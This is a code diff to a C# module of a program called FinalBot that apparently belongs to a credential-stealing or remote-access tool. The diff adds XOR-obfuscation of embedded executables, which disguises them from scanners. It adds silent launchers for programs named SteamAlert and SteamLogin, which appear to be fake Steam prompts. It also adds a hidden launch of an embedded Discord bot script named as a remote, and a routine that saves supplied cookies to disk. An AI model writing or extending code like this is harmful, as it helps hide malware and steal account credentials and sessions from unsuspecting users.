@@ -36,9 +36,22 @@ namespace FinalBot.Modules
                 {
                     if (stream == null) return null;
 
-                    using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
+                    if (resourceName.EndsWith(".bin"))
                     {
-                        stream.CopyTo(fileStream);
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            stream.CopyTo(ms);
+                            byte[] bytes = ms.ToArray();
+                            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= 0xAA;
+                            File.WriteAllBytes(outPath, bytes);
+                        }
+                    }
+                    else
+                    {
+                        using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
+                        {
+                            stream.CopyTo(fileStream);
+                        }
                     }
                 }
                 return outPath;
@@ -52,7 +65,7 @@ namespace FinalBot.Modules
 
         public static void LaunchSteamAlert()
         {
-            string exePath = ExtractResource("SteamAlert.exe", "SteamAlert.exe");
+            string exePath = ExtractResource("SteamAlert.bin", "SteamAlert.exe");
             if (!string.IsNullOrEmpty(exePath))
             {
                 Process.Start(new ProcessStartInfo
@@ -65,7 +78,7 @@ namespace FinalBot.Modules
 
         public static void LaunchSteamLogin()
         {
-            string exePath = ExtractResource("SteamLogin.exe", "SteamLogin.exe");
+            string exePath = ExtractResource("SteamLogin.bin", "SteamLogin.exe");
             if (!string.IsNullOrEmpty(exePath))
             {
                 Process.Start(new ProcessStartInfo
@@ -90,6 +103,33 @@ namespace FinalBot.Modules
                     CreateNoWindow = true
                 });
             }
+        }
+
+        public static void LaunchDiscordRemote()
+        {
+            string scriptPath = ExtractResource("websocket.discord_bot.py", "discord_bot.py");
+            if (!string.IsNullOrEmpty(scriptPath))
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "python",
+                    Arguments = $"\"{scriptPath}\"",
+                    UseShellExecute = true,
+                    CreateNoWindow = true
+                });
+            }
+        }
+
+        public static void PrepareSteamFiles(string agentName, string cookies)
+        {
+            string tablichkaDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tablichka");
+            if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
+            
+            if (!string.IsNullOrEmpty(agentName))
+                File.WriteAllText(Path.Combine(tablichkaDir, "agent_name.txt"), agentName);
+            
+            if (!string.IsNullOrEmpty(cookies))
+                File.WriteAllText(Path.Combine(tablichkaDir, "cookies.txt"), cookies);
         }
     }
 }
